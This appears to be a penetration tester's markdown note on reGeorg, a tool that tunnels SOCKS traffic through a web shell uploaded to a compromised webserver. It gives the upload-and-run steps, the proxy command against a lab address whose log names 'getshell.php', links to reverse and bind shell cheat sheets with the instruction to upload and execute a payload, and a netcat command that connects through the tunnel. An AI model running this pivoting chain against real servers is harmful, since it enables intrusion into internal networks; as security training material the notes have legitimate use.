# reGeorg - web-based proxy server

https://github.com/sensepost/reGeorg

Step 1. Upload tunnel.(aspx|ashx|jsp|php) to a webserver (How you do that is up to you)

Step 2. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py

** Note, if you tools, such as NMap doesn't support socks proxies, use proxychains (see wiki)

Step 3. Hack the planet :)

## Requirement

netcat-openbsd

    sudo apt install netcat-openbsd
<!-- -->
    ┌──(kali㉿kali)-[~]
    └─$ nc -h
    OpenBSD netcat (Debian patchlevel 1.218-5)
    usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
    [-m minttl] [-O length] [-P proxy_username] [-p source_port]
    [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]
    [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
    [destination] [port]
    Command Summary:
    -4              Use IPv4
    -6              Use IPv6
    -b              Allow broadcast
    -C              Send CRLF as line-ending
    -D              Enable the debug socket option
    -d              Detach from stdin
    -F              Pass socket fd
    -h              This help text
    -I length       TCP receive buffer length
    -i interval     Delay interval for lines sent, ports scanned
    -k              Keep inbound sockets open for multiple connects
    -l              Listen mode, for inbound connects
    -M ttl          Outgoing TTL / Hop Limit
    -m minttl       Minimum incoming TTL / Hop Limit
    -N              Shutdown the network socket after EOF on stdin
    -n              Suppress name/port resolutions
    -O length       TCP send buffer length
    -P proxyuser    Username for proxy authentication
    -p port         Specify local port for remote connects
    -q secs         quit after EOF on stdin and delay of secs
    -r              Randomize remote ports
    -S              Enable the TCP MD5 signature option
    -s sourceaddr   Local source address
    -T keyword      TOS value
    -t              Answer TELNET negotiation
    -U              Use UNIX domain socket
    -u              UDP mode
    -V rtable       Specify alternate routing table
    -v              Verbose
    -W recvlimit    Terminate after receiving a number of packets
    -w timeout      Timeout for connects and final net reads
    -X proto        Proxy protocol: "4", "5" (SOCKS) or "connect"
    -x addr[:port]  Specify proxy address and port
    -Z              DCCP mode
    -z              Zero-I/O mode [used for scanning]
    Port numbers can be individual or ranges: lo-hi [inclusive]


## Usage

    python2.7 reGeorgSocksProxy.py -u http://192.168.56.118/site/tunnel.nosocket.php
<!-- -->    
    
                         _____                                                                                                                    
    _____   ______  __|___  |__  ______  _____  _____   ______                                                                                  
    |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|                                                                                 
    |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |                                                                                 
    |__|\__\|______||______|  __||______|\_____/|__|\__\|______|                                                                                 
    |_____|                                                                                                                   
    ... every office needs a tool like Georg
    
    willem@sensepost.com / @_w_m__                                                                                                              
    sam@sensepost.com / @trowalts                                                                                                               
    etienne@sensepost.com / @kamp_staaldraad
    
    
    [INFO   ]  Log Level set to [INFO]
    [INFO   ]  Starting socks server [127.0.0.1:8888], tunnel at [http://192.168.56.118/site/getshell.php]
    [INFO   ]  Checking if Georg is ready
    [INFO   ]  Georg says, 'All seems fine'

Upload a payload and execute it  
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md  
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Listen through the proxy

    nc -v -x localhost:8888 -X5 localhost 51337

On the reGeorg tool you'll see

    [INFO   ]  [localhost:51337] <<<< [131]